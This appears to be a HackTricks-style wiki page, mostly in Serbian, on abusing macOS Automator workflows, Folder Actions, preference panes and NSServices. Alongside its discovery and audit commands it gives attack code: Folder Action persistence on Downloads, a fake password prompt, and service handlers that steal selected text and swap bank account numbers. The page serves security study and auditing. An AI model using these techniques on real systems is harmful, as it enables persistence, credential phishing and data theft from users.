# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Basic Information

**Automator** je vizuelni alat za automatizaciju u macOS-u. On izvršava **workflows** (`.workflow` bundles) sastavljene od **actions** (`.action` bundles). Automator takođe pokreće integraciju za **Folder Actions**, **Quick Actions** i **Shortcuts**. Na modernom macOS-u, workflows mogu takođe biti **imported into Shortcuts**, tako da se ista zlonamerna logika može pojaviti kao Finder Quick Action, user service u `~/Library/Services/`, ili shortcut zasnovan na legacy Automator actions.

Automator actions su **plugins** učitani u Automator runtime kada se workflow izvrši. Oni mogu:
- Izvršavati proizvoljne shell skripte
- Obrađivati fajlove i podatke
- Interagovati sa aplikacijama preko AppleScript
- Lančati se za složenu automatizaciju

### Why This Matters

> [!WARNING]
> Automator workflows mogu biti **social-engineered** da se pokrenu — izgledaju kao obični dokument fajlovi. `.workflow` bundle može da sadrži ugrađene shell komande koje se izvršavaju kada se workflow pokrene. U kombinaciji sa Folder Actions, oni pružaju **automatic persistence** koja se aktivira na događaje vezane za fajlove. Nedavne Gatekeeper ispravke takođe su pokazale da **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) moraju biti tretirane kao izvršni sadržaj, a ne bezazleni podaci.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Napad: Social-Engineered Workflow

`.workflow` bundle izgleda kao normalna datoteka dokumenta za većinu korisnika:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Napad: Folder Action Persistence

Folder Actions automatski izvršavaju workflow kada se fajlovi dodaju u nadgledani folder:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions traju kroz reboot-ove i izvršavaju se tiho. Folder Action na `~/Downloads` znači da **svaki preuzeti fajl pokreće tvoj payload** — uključujući fajlove iz Safari, Chrome, AirDrop i email attachmente. Takođe imaj na umu da `System Events` može da registruje Folder Actions koji upućuju na skripte van podrazumevanih lokacija `~/Library/Scripts/Folder Action Scripts`, što čini pretragu za loose-path korisnom. Za povezane TCC implikacije, proveri [the TCC page](../macos-security-protections/macos-tcc/README.md).

---

## Preference Panes

### Basic Information

Preference panes (`.prefPane` bundles) su pluginovi učitani iz **System Settings** (ranije System Preferences). Oni pružaju UI panele za konfiguraciju sistemskih ili third-party funkcija. Na starijim sistemima učitavani su direktno od strane `System Preferences`; na novijim izdanjima third-party pane-ovi su često posredovani preko **legacy loader XPC service** pokrenutog iz System Settings.

### Why This Matters

- Preference panes se izvršavaju u **trusted host process**-u koji pokreće System Settings / System Preferences
- Na modernim sistemima taj host može biti **`legacyLoader` XPC service**, pa je važna granica i dalje **trusted Apple UI process -> third-party code loading**
- Third-party preference panes nasleđuju **host process security context** i user trust vezan za taj UI
- Korisnici instaliraju preference panes tako što ih **double-click**-uju — lako za social engineering
- Jednom instalirani, oni **persist** i učitavaju se svaki put kada System Settings otvori taj panel

### Discovery
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Napad: Hijacking privilegovanog konteksta

Zlonamerna preference pane nasleđuje bezbednosni kontekst **hosta panela** (istorijski `System Preferences`, na novijim verzijama često `legacyLoader` helper pokrenut od strane `System Settings`):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Napad: Persistence via Installation
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Napad: UI Phishing

Preference pane može da oponaša legitimne sistemske UI panele kako bi **phishovao kredencijale**:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Basic Information

**NSServices** omogućavaju aplikacijama da pružaju funkcionalnost drugim aplikacijama kroz **Services menu** (desni klik → Services). Kada korisnik izabere tekst ili podatke i pokrene service, izabrani podaci se **šalju service provider-u** na obradu.

Services se deklarišu u `Info.plist` aplikacije pod `NSServices` ključem i registruju sa pasteboard serverom (`pbs`). macOS takođe čuva **service cache** i **restriction policy** koji određuju koji su servisi vidljivi i da li sandboxed caller-i treba da dobiju dodatno upozorenje.

### Why This Matters

- Services primaju **cross-application data flow** — izabrani tekst iz bilo koje aplikacije se šalje service-u
- Malicious service presreće podatke iz password manager-a, email klijenata, financial app-ova
- Services mogu da **vrate modifikovane podatke** pozivajućoj aplikaciji (man-in-the-middle nad selection operacijama)
- Imena servisa mogu biti napravljena da deluju legitimno ("Format Text", "Encrypt Selection", "Share")
- Opcioni `NSRestricted` flag je bezbednosno relevantan: service označen kao unrestricted može biti pozvan od strane sandboxed aplikacije bez upozorenja koje macOS prikazuje za escape-prone services

### Discovery
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Napad: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Napad: Modifikacija podataka (Man-in-the-Middle)

Servis može **modifikovati vraćene podatke** dok izgleda kao da pruža legitimnu funkciju:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Restricted Services & Modern Abuse

Apple podržava opcioni `NSRestricted` boolean po definiciji servisa. Ako je podešen, macOS upozorava sandboxed pozivaoce jer servis može da im pomogne da **escape sandbox or privacy boundaries**. Iz ofanzivne perspektive, ovo daje dve korisne audit putanje:

- Traži **third-party services not marked as restricted** čak i kada proxy-ju Apple Events, pristup fajlovima ili druge privilegovane akcije
- Traži **high-value built-in services** sa jakim entitlements (na primer, servise izložene preko Script Editor ili Finder-backed helpers) i proveri da li je korisnička interakcija dovoljna da ih pretvori u data-access primitive

Dobar noviji primer je **CVE-2022-48574**, gde je Services mehanizam mogao da se zloupotrebi za pristup **TCC-protected user files without the expected confirmation flow**. Buba je ispravljena, ali tehnika ostaje korisna za threat modeling: svaki servis koji prosleđuje pristup fajlovima ili automation zahteve u ime pozivaoca zaslužuje istu proveru.

---

## Recent Security Notes

- **Quick Actions are executable content**: Apple je 2024. ispravio Gatekeeper bypass gde je app-bundled Automator Quick Action mogao da se izvrši bez normalne procene. Kada auditiraš aplikacije, pregledaj `Contents/PlugIns/*.workflow/Contents/document.wflow` baš kao što bi pregledao helper skripte ili login items. Pogledaj [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).
- **Shortcuts can inherit legacy Automator behavior**: Apple je takođe dodao dodatni user-consent prompt nakon što su third-party shortcuts pronađeni kako koriste **legacy Automator action** da šalju Apple Events bez očekivanog permission flow-a. Uvezeni workflows i shortcut bundles treba pregledati zbog `Run AppleScript`, `Run Shell Script` i sličnih bridge actions. Pogledaj [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator is still a live privacy boundary**: Apple je 2025. objavio još jednu Automator ispravku za pristup protected user data. Čak i ako je Automator legacy površina, tretiraj svaki workflow runner, Quick Action host ili automation bridge kao aktuelnu attack surface, a ne kao mrtav kod.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Eskalacija
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Krađa Password Manager-a
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## References

* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
